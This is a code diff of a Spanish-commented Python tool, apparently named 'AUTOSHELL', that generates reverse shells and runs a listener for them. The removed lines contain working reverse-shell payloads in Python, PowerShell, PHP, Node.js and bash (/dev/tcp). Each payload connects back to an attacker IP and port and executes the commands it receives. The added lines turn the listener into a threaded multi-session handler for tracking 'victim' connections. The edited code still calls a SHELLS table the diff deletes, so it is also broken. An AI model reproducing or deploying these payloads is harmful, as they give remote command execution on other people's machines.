@@ -3,6 +3,7 @@ import socket
 import subprocess
 import platform
 import re
+import threading
 
 # Colores para terminal (Windows no los soporta por defecto)
 if platform.system() == "Windows":
@@ -10,7 +11,10 @@ if platform.system() == "Windows":
 else:
     RED, GREEN, CYAN, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[0m"
 
+# Variable para almacenar las sesiones activas
+sessions = {}
 
+# Función para mostrar el banner
 def banner():
     print(f"""{CYAN}
  █████╗ ██╗   ██╗████████╗ ██████╗ ███████╗██╗  ██╗██╗     
@@ -21,7 +25,7 @@ def banner():
 ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝
 {RESET}---- By: MARH ------------------------------------------- {RESET}""")
 
-
+# Función para gestionar la entrada del usuario
 def get_option(prompt, valid_options):
     while True:
         choice = input(prompt).strip()
@@ -29,108 +33,20 @@ def get_option(prompt, valid_options):
             return choice
         print(f"{RED}[!] Opción inválida. Inténtalo de nuevo.{RESET}")
 
-
+# Función para validar IP
 def validate_ip(ip):
     return re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip)
 
-
+# Función para validar puerto
 def validate_port(port):
     return port.isdigit() and 1 <= int(port) <= 65535
 
-
+# Función para validar directorios
 def validate_path(path):
     path = os.path.expanduser(path)  # Expande rutas como ~/Desktop
     return os.path.isdir(path)
 
-
-def get_user_input():
-    print("\n📌 Selecciona el sistema operativo de la víctima:")
-    os_choice = get_option("1️⃣ Windows\n2️⃣ Linux / MacOS\n\n[+] Opción: ", ["1", "2"])
-
-    print("\n📌 Selecciona el lenguaje para la shell reversa:")
-    lang_options = ["1", "2", "3", "4", "5"] if os_choice == "2" else ["1", "5"]
-    lang_choice = get_option("1️⃣ Python\n2️⃣ PHP\n3️⃣ JavaScript (Node.js)\n4️⃣ Bash\n5️⃣ PowerShell\n\n[+] Opción: ",
-                             lang_options)
-
-    while True:
-        attacker_ip = input("[+] IP del atacante: ").strip()
-        if validate_ip(attacker_ip):
-            break
-        print(f"{RED}[!] IP inválida. Inténtalo de nuevo.{RESET}")
-
-    while True:
-        port = input("[+] Puerto a usar: ").strip()
-        if validate_port(port):
-            break
-        print(f"{RED}[!] Puerto inválido. Ingresa un número entre 1 y 65535.{RESET}")
-
-    while True:
-        save_path = input("[+] Ruta donde guardar los archivos: ").strip()
-        save_path = os.path.abspath(save_path)  # Convierte a ruta absoluta
-        if validate_path(save_path):
-            break
-        print(f"{RED}[!] Ruta no válida. Asegúrate de que existe.{RESET}")
-
-    return os_choice, lang_choice, attacker_ip, port, save_path
-
-
-SHELLS = {
-    "1": {  # Windows
-        "1": ("reverse_python.py", """import socket, subprocess
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("{}", {}))
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd.lower() == "exit": break
-    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    s.send(output.stdout.encode() + output.stderr.encode())
-s.close()"""),
-
-        "5": ("reverse_powershell.ps1", """$client = New-Object System.Net.Sockets.TCPClient("{}", {})
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{{0}}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
-    $stream.Write($sendbyte,0,$sendbyte.Length)
-    $stream.Flush()
-}}
-$client.Close()"""),
-    },
-
-    "2": {  # Linux / MacOS
-        "1": ("reverse_python.py", """import socket, subprocess
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("{}", {}))
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd.lower() == "exit": break
-    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    s.send(output.stdout.encode() + output.stderr.encode())
-s.close()"""),
-
-        "2": ("reverse_php.php", """<?php
-$sock=fsockopen("{}", {});
-$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
-?>"""),
-
-        "3": ("reverse_node.js", """const net = require("net");
-const {{ exec }} = require("child_process");
-const client = new net.Socket();
-client.connect({}, "{}", () => {{}}); 
-client.on("data", (data) => {{
-    exec(data.toString(), (error, stdout, stderr) => {{
-        client.write(stdout + stderr);
-    }});
-}});"""),
-
-        "4": ("reverse_bash.sh", """#!/bin/bash
-bash -i >& /dev/tcp/{}/{} 0>&1"""),
-    }
-}
-
-
+# Función para generar la shell
 def generate_shell(os_choice, lang_choice, attacker_ip, port, save_path):
     if lang_choice in SHELLS[os_choice]:
         filename, shell_content = SHELLS[os_choice][lang_choice]
@@ -143,22 +59,46 @@ def generate_shell(os_choice, lang_choice, attacker_ip, port, save_path):
     else:
         print(f"{RED}❌ Error al generar los archivos. Verifica las opciones.{RESET}")
 
+# Función para listar sesiones activas
+def list_sessions():
+    if not sessions:
+        print(f"{RED}[!] No hay sesiones activas.{RESET}")
+        return
 
-def start_server(attacker_ip, port):
-    # Crear socket para escuchar conexiones
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((attacker_ip, port))
-    s.listen(1)  # Escuchar una conexión
-    print(f"📡 Esperando conexión en {attacker_ip}:{port}...")
+    # Títulos de las columnas
+    print(f"{CYAN}{'ID':<5}{'IP VICTIMA':<20}{'SO VICTIMA':<15}{'ESTADO':<10}{RESET}")
+    
+    for session_id, session in sessions.items():
+        estado = "Conectado" if session["estado"] == "conectado" else "Desconectado"
+        print(f"{session_id:<5}{session['ip']:<20}{session['os']:<15}{estado:<10}")
 
-    # Aceptar la conexión de la víctima
-    conn, addr = s.accept()
+# Función para usar una sesión
+def use_session(session_id):
+    if session_id in sessions:
+        print(f"{GREEN}[+] Usando la sesión {session_id}...{RESET}")
+        # Aquí puedes realizar las interacciones con la sesión
+    else:
+        print(f"{RED}[!] Sesión {session_id} no encontrada.{RESET}")
+
+# Función para eliminar una sesión
+def kill_session(session_id):
+    if session_id in sessions:
+        del sessions[session_id]
+        print(f"{GREEN}[+] Sesión {session_id} eliminada correctamente.{RESET}")
+    else:
+        print(f"{RED}[!] Sesión {session_id} no encontrada.{RESET}")
+
+# Función para aceptar la conexión de una víctima y crear una sesión
+def handle_connection(conn, addr, session_id, attacker_ip, port):
     print(f"✅ Conexión recibida de {addr}")
+    # Guarda la sesión activa
+    victim_os = "Windows"  # O se puede determinar dinámicamente
+    sessions[session_id] = {"ip": addr[0], "os": victim_os, "estado": "conectado"}
 
     # Interactuar con la víctima
     while True:
         cmd = input(f"{attacker_ip} > ")
-        
+
         if cmd.lower() == "exit":
             conn.send(cmd.encode())
             break
@@ -168,11 +108,58 @@ def start_server(attacker_ip, port):
         print(response)
 
     conn.close()
-    s.close()
+    # Cambiar el estado a "Desconectado" cuando la conexión se cierre
+    sessions[session_id]["estado"] = "desconectado"
+
+# Función para iniciar el servidor
+def start_server(attacker_ip, port):
+    # Crear socket para escuchar conexiones
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((attacker_ip, port))
+    s.listen(5)  # Escuchar hasta 5 conexiones
+    print(f"📡 Esperando conexión en {attacker_ip}:{port}...")
+
+    session_id = 1  # Usamos un ID incremental para cada sesión
+    while True:
+        # Aceptar la conexión de la víctima
+        conn, addr = s.accept()
+
+        # Crear un hilo para manejar esta conexión
+        threading.Thread(target=handle_connection, args=(conn, addr, session_id, attacker_ip, port)).start()
+
+        session_id += 1  # Incrementar el ID para la siguiente sesión
+
+# Función principal que interactúa con el usuario
+def main():
+    banner()
+
+    while True:
+        print(f"{CYAN}\nComandos disponibles:{RESET}")
+        print("1️⃣ list sessions")
+        print("2️⃣ use session <ID>")
+        print("3️⃣ kill session <ID>")
+        print("4️⃣ exit")
+
+        cmd = input(f"{CYAN}[+] Ingrese un comando: {RESET}")
+
+        if cmd == "list sessions":
+            list_sessions()
+
+        elif cmd.startswith("use session"):
+            session_id = cmd.split()[-1]
+            use_session(session_id)
+
+        elif cmd.startswith("kill session"):
+            session_id = cmd.split()[-1]
+            kill_session(session_id)
+
+        elif cmd.lower() == "exit":
+            print(f"{GREEN}[+] Saliendo...{RESET}")
+            break
+
+        else:
+            print(f"{RED}[!] Comando no válido.{RESET}")
 
 
 if __name__ == "__main__":
-    banner()
-    os_choice, lang_choice, attacker_ip, port, save_path = get_user_input()
-    generate_shell(os_choice, lang_choice, attacker_ip, port, save_path)
-    start_server(attacker_ip, port)
+    main()
